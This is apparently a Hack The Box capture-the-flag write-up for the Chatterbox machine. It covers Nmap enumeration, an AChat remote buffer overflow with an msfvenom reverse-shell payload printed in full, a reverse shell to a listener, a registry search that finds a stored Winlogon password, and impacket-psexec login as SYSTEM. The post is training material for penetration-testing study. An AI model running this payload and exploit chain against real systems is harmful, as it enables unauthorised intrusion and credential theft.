---
layout: post
title:  HTB Chatterbox Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-10 09:00:00 +0300
image:  '/images/htb_chatterbox.png'
tags:   [Write-ups, HTB, OSCP+, Windows, Medium, AChat, Buffer-Overflow, Credentials-in-Registry, Password-Reuse, PsExec]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
- [Foothold](#foothold)
  - [Creating custom Buffer Overflow with msfvenom and replacing the one in the exploit to get access as the user alfred](#creating-custom-buffer-overflow-with-msfvenom-and-replacing-the-one-in-the-exploit-to-get-access-as-the-user-alfred)
- [Privilege Escalation](#privilege-escalation)
  - [Privilege Escalation Enumeration](#privilege-escalation-enumeration)
  - [Finding Password in the Registry](#finding-password-in-the-registry)
  - [Getting access as Administrator using PsExec and the password of alfred](#getting-access-as-administrator-using-psexec-and-the-password-of-alfred)

# Enumeration
### Nmap

```shell
# Step 1 - Find active ports
sudo nmap -p- -Pn --min-rate 10000 10.129.140.222

# Step 2 - Focus scan on the active ports found (Note: In this case is important to use -T4 to make the scan succeed)
sudo nmap -A -T4 -Pn -p135,139,445,9255,9256 10.129.140.222
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-10 02:41 EST
Nmap scan report for 10.129.140.222
Host is up (0.033s latency).

PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp open  http         AChat chat system httpd
|_http-title: Site doesn't have a title.
|_http-server-header: AChat
9256/tcp open  achat        AChat chat system
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 7 SP1 (95%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 (95%), Microsoft Windows Windows 7 SP1 (95%), Microsoft Windows Vista Home Premium SP1, Windows 7, or Windows Server 2008 (95%), Microsoft Windows Vista SP1 (95%), Microsoft Windows 7 SP1 or Windows Server 2008 (93%), Microsoft Windows 8.1 (93%), Microsoft Windows 8.1 Update 1 (93%), Microsoft Windows 7 Enterprise (93%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 SP1 or Windows 8.1 Update 1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-10T12:42:00
|_  start_date: 2024-11-10T12:29:52
|_clock-skew: mean: 6h40m00s, deviation: 2h53m14s, median: 4h59m59s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-11-10T07:41:58-05:00
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   33.14 ms 10.10.14.1
2   33.28 ms 10.129.140.222

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.73 seconds
```

Examining the results of Nmap, we can see that there is a service called AChat running on Ports 9255 and 9256.

Lets try to find an exploit using searchsploit:

```shell
searchsploit achat
```

```shell
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow                                        | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)                           | windows/remote/36056.rb
MataChat - 'input.php' Multiple Cross-Site Scripting Vulnerabilities              | php/webapps/32958.txt
Parachat 5.5 - Directory Traversal                                                | php/webapps/24647.txt
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

It seems like there is a Remote Buffer Overflow. Lets get the version without Metasploit:

```shell
searchsploit -m 36025
```

We can take a look at the code of the exploit to see how it works:

```shell
cat 36025.py
```

It looks like a Buffer Overflow.

# Foothold
### Creating custom Buffer Overflow with msfvenom and replacing the one in the exploit to get access as the user alfred

We can use msfvenom to create our own Buffer Overflow Payload using the following command with our Kali IP and nc listener port:

```shell
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.206 LPORT=8443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

Now we got our Buffer Overflow:

```shell
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51"
buf += b"\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"
buf += b"\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31"
buf += b"\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51"
buf += b"\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31"
buf += b"\x31\x41\x49\x41\x4a\x51\x59\x41\x5a\x42\x41\x42"
buf += b"\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39"
buf += b"\x75\x34\x4a\x42\x49\x6c\x6a\x48\x34\x42\x69\x70"
buf += b"\x6b\x50\x6d\x30\x33\x30\x55\x39\x37\x75\x6c\x71"
buf += b"\x67\x50\x70\x64\x72\x6b\x4e\x70\x4e\x50\x44\x4b"
buf += b"\x52\x32\x6c\x4c\x62\x6b\x61\x42\x6a\x74\x62\x6b"
buf += b"\x51\x62\x6c\x68\x6c\x4f\x56\x57\x6e\x6a\x6b\x76"
buf += b"\x4e\x51\x79\x6f\x66\x4c\x4d\x6c\x50\x61\x53\x4c"
buf += b"\x59\x72\x4c\x6c\x6d\x50\x49\x31\x76\x6f\x6a\x6d"
buf += b"\x6d\x31\x65\x77\x69\x52\x38\x72\x62\x32\x71\x47"
buf += b"\x42\x6b\x51\x42\x6c\x50\x54\x4b\x4e\x6a\x6d\x6c"
buf += b"\x32\x6b\x6e\x6c\x6e\x31\x50\x78\x6a\x43\x31\x38"
buf += b"\x4a\x61\x4a\x31\x6e\x71\x62\x6b\x70\x59\x4d\x50"
buf += b"\x69\x71\x39\x43\x54\x4b\x61\x39\x6c\x58\x68\x63"
buf += b"\x6e\x5a\x4f\x59\x74\x4b\x6e\x54\x72\x6b\x4b\x51"
buf += b"\x79\x46\x6e\x51\x49\x6f\x66\x4c\x67\x51\x58\x4f"
buf += b"\x6a\x6d\x39\x71\x56\x67\x4c\x78\x77\x70\x32\x55"
buf += b"\x59\x66\x4d\x33\x71\x6d\x68\x78\x4f\x4b\x53\x4d"
buf += b"\x4e\x44\x74\x35\x48\x64\x61\x48\x34\x4b\x4e\x78"
buf += b"\x4b\x74\x5a\x61\x4a\x33\x6f\x76\x44\x4b\x4c\x4c"
buf += b"\x50\x4b\x52\x6b\x52\x38\x4b\x6c\x6a\x61\x5a\x33"
buf += b"\x54\x4b\x6a\x64\x42\x6b\x49\x71\x38\x50\x43\x59"
buf += b"\x61\x34\x6d\x54\x6e\x44\x31\x4b\x4f\x6b\x30\x61"
buf += b"\x6e\x79\x61\x4a\x30\x51\x79\x6f\x67\x70\x71\x4f"
buf += b"\x61\x4f\x61\x4a\x72\x6b\x6a\x72\x68\x6b\x62\x6d"
buf += b"\x4f\x6d\x50\x68\x4f\x43\x4f\x42\x4d\x30\x59\x70"
buf += b"\x61\x58\x33\x47\x72\x53\x4d\x62\x71\x4f\x51\x44"
buf += b"\x52\x48\x6e\x6c\x43\x47\x4e\x46\x39\x77\x39\x6f"
buf += b"\x66\x75\x36\x58\x46\x30\x5a\x61\x6d\x30\x4d\x30"
buf += b"\x4b\x79\x57\x54\x61\x44\x50\x50\x30\x68\x4b\x79"
buf += b"\x53\x50\x72\x4b\x59\x70\x79\x6f\x66\x75\x70\x50"
buf += b"\x32\x30\x62\x30\x62\x30\x6d\x70\x70\x50\x6d\x70"
buf += b"\x50\x50\x71\x58\x6a\x4a\x5a\x6f\x67\x6f\x57\x70"
buf += b"\x69\x6f\x5a\x35\x32\x77\x42\x4a\x59\x75\x63\x38"
buf += b"\x4b\x5a\x69\x7a\x4c\x4e\x76\x6e\x73\x38\x6b\x52"
buf += b"\x69\x70\x6b\x70\x4b\x4b\x73\x59\x77\x76\x61\x5a"
buf += b"\x5a\x70\x62\x36\x62\x37\x43\x38\x36\x39\x47\x35"
buf += b"\x32\x54\x6f\x71\x6b\x4f\x77\x65\x43\x55\x57\x50"
buf += b"\x61\x64\x5a\x6c\x79\x6f\x6e\x6e\x59\x78\x51\x65"
buf += b"\x7a\x4c\x62\x48\x4a\x50\x54\x75\x57\x32\x30\x56"
buf += b"\x6b\x4f\x5a\x35\x31\x58\x70\x63\x50\x6d\x6f\x74"
buf += b"\x6d\x30\x72\x69\x37\x73\x42\x37\x51\x47\x6f\x67"
buf += b"\x4e\x51\x4c\x36\x61\x5a\x4e\x32\x4e\x79\x4f\x66"
buf += b"\x47\x72\x39\x6d\x51\x56\x55\x77\x50\x44\x6c\x64"
buf += b"\x4d\x6c\x4a\x61\x6a\x61\x54\x4d\x61\x34\x6d\x54"
buf += b"\x6c\x50\x48\x46\x59\x70\x4f\x54\x30\x54\x70\x50"
buf += b"\x4e\x76\x52\x36\x30\x56\x70\x46\x72\x36\x70\x4e"
buf += b"\x4e\x76\x62\x36\x42\x33\x31\x46\x33\x38\x54\x39"
buf += b"\x66\x6c\x6f\x4f\x45\x36\x4b\x4f\x58\x55\x74\x49"
buf += b"\x59\x50\x70\x4e\x31\x46\x6e\x66\x4b\x4f\x50\x30"
buf += b"\x52\x48\x6b\x58\x71\x77\x6b\x6d\x6f\x70\x4b\x4f"
buf += b"\x6a\x35\x65\x6b\x6c\x30\x58\x35\x65\x52\x4e\x76"
buf += b"\x72\x48\x76\x46\x62\x75\x77\x4d\x65\x4d\x59\x6f"
buf += b"\x39\x45\x6d\x6c\x6d\x36\x31\x6c\x6b\x5a\x61\x70"
buf += b"\x6b\x4b\x6b\x30\x50\x75\x59\x75\x57\x4b\x31\x37"
buf += b"\x4a\x73\x62\x52\x52\x4f\x32\x4a\x4d\x30\x72\x33"
buf += b"\x69\x6f\x39\x45\x41\x41"
```

Replace the part of the Buffer Overflow inside the exploit with our Buffer Overflow:

```shell
sudo gedit 36025.py
```

And change the following line with the IP of our target machine:

```shell
# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('10.129.140.222', 9256)
```

Now start our nc listener:

```shell
nc -lvnp 8443
```

And run the exploit (Note that the exploit uses python2):

```shell
python2 36025.py
```

It worked! We got a response on our nc listener:

```shell
listening on [any] 8443 ...
connect to [10.10.14.206] from (UNKNOWN) [10.129.140.222] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\alfred
```

### User Flag
Now we can get the user.txt flag:

```shell
type C:\Users\alfred\Desktop\user.txt
```

# Privilege Escalation
### Privilege Escalation Enumeration
Check system information, useful for locating kernel exploits:

```
systeminfo
```

Check our user name in the target machine:

```
whoami
```

Check for other users in the target machine:

```
net users
```

Check our IP configuration in the target machine:

```
ipconfig
```

Check status of ports in target machine:

```
netstat -ano
```

We didnt find much of interest. Lets search for credentials.
### Finding Password in the Registry
Here we can find multiple methods and commands to search for passwords: https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html

We will use the "Search for password in registry" one since it's fast and could be an easy win:

```shell
reg query HKLM /f password /t REG_SZ /s
```

Scrolling down in the results we found out we got a password as a result:

```shell
<SNIP>
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultPassword    REG_SZ    Welcome1!
<SNIP>
```

Do a reg query to check it:

```shell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

We can see in the results that this might be the password for the user alfred.

But how can we use it?

Maybe alfred is an Administrator who is just logged in as a regular user and this is actually the Administrator password?

### Getting access as Administrator using PsExec and the password of alfred
Let's use impacket-psexec with the credentials of alfred but using Administrator as user and see if we are lucky:

```shell
impacket-psexec Administrator:'Welcome1!'@10.129.140.224
```

```shell
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 10.129.140.224.....
[*] Found writable share ADMIN$
[*] Uploading file dHFwPmSi.exe
[*] Opening SVCManager on 10.129.140.224.....
[*] Creating service FDES on 10.129.140.224.....
[*] Starting service FDES.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>
```

Nice! We got access as NT AUTHORITY\SYSTEM.

### Root Flag
Now we can get the root.txt flag:

```shell
type C:\Users\Administrator\root.txt
```

